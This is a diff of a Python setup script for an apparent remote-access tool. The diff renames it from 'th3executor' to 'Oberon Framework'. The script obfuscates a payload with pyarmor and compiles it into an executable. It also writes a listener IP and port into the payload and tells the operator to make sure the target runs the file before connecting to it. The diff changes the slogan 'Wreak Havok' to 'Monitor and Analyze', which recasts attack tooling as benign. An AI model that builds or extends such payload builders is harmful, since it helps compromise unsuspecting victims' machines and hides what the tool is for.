@@ -122,7 +122,7 @@ class PayloadSetup:
         if not os.path.exists("payload.py"):
             print(
                 "[-] Unable to find 'payload.py'. Please ensure this file "
-                "is inside your 'th3executor' directory. Exiting!"
+                "is inside your 'oberon-framework' directory. Exiting!"
             )
             return
         command = ["pyarmor", "gen", "payload.py"]
@@ -233,10 +233,10 @@ class PayloadSetup:
             self._download_libraries(self.optional_libraries)
             print()
             print("Enter the name of your custom file")
-            file_name = input("Executable Name > ").lower().strip() or "executor_exe"
+            file_name = input("Executable Name > ").lower().strip() or "oberon_payload"
         else:
             raise SystemExit(
-                "Aborted. Setup complete, Run the main program with 'python3 th3executor.py'"
+                "Aborted. Setup complete, Run the main program with 'python3 oberon_framework.py'"
             )
         print("\nEXECUTABLE CONFIGURATION COMPLETED - Preparing to compile payload")
         time.sleep(3)
@@ -259,21 +259,21 @@ class PayloadSetup:
     # ------------------------------------------------------------------
     def _setup_exit_section(self) -> None:
         self._clear_screen_banner("Setup Complete!")
-        print("Th3Executor Setup Completed! Steps to follow :")
+        print("Oberon Framework Setup Completed! Steps to follow :")
         print(
             """      > Ensure target runs the converted executable file
-        > Run the 'th3executor' server script
+        > Run the 'oberon_framework.py' server script
         > Seamlessly connect to the target
-        > EXECUTE and Wreak Havok"""
+        > Monitor and Analyze"""
         )
         raise SystemExit(
-            "\nYou may now run 'python3 th3executor.py' to start th3executor on your local machine, Goodbye!"
+            "\nYou may now run 'python3 oberon_framework.py' to start Oberon Framework on your local machine, Goodbye!"
         )
 
     # ------------------------------------------------------------------
     def _update_ip_port_in_payload(self, ip: str, port: str) -> None:
         file_path_payload = "payload.py"
-        file_path_main = "th3executor.py"
+        file_path_main = "oberon_framework.py"
         if not os.path.exists(file_path_payload):
             print(
                 f"[-] The file '{file_path_payload}' does not exist! Ensure you have {file_path_payload} in your current directory. Skipping options!"
